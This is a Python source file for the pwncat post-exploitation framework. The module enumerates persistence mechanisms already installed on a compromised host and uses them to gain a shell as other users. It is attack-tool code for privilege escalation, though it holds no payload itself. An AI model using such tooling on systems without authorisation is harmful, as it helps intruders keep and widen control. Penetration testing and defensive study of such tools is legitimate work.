#!/usr/bin/env python3

import pwncat
from pwncat.modules import Status
from pwncat.platform import Platform
from pwncat.gtfobins import Capability
from pwncat.modules.persist import PersistError, PersistType
from pwncat.modules.persist.gather import InstalledModule
from pwncat.modules.escalate import EscalateError, EscalateModule, Technique


class PersistenceTechnique(Technique):
    """ Escalates privileges utilizing an installed persistence
    technique. """

    def __init__(self, module: EscalateModule, user: str, persist: InstalledModule):
        super(PersistenceTechnique, self).__init__(Capability.SHELL, user, module)

        self.persist = persist

    def exec(self, binary: str):
        """ Run the given shell as another user """

        try:
            # Attempt to escalate
            self.persist.escalate(user=self.user, progress=self.module.progress)
        except PersistError as exc:
            raise EscalateError(str(exc))


class Module(EscalateModule):
    """ This module will enumerate all installed persistence methods which
    offer local escalation. """

    PLATFORM = Platform.ANY

    def enumerate(self):

        for persist in pwncat.modules.run("persist.gather", progress=self.progress):
            if PersistType.LOCAL not in persist.module.TYPE:
                continue
            if persist.persist.user is None:
                users = pwncat.victim.users.keys()
            else:
                users = persist.persist.user
            for user in users:
                yield PersistenceTechnique(self, user, persist)

        return

    def human_name(self, tech: PersistenceTechnique):
        return str(tech.persist)
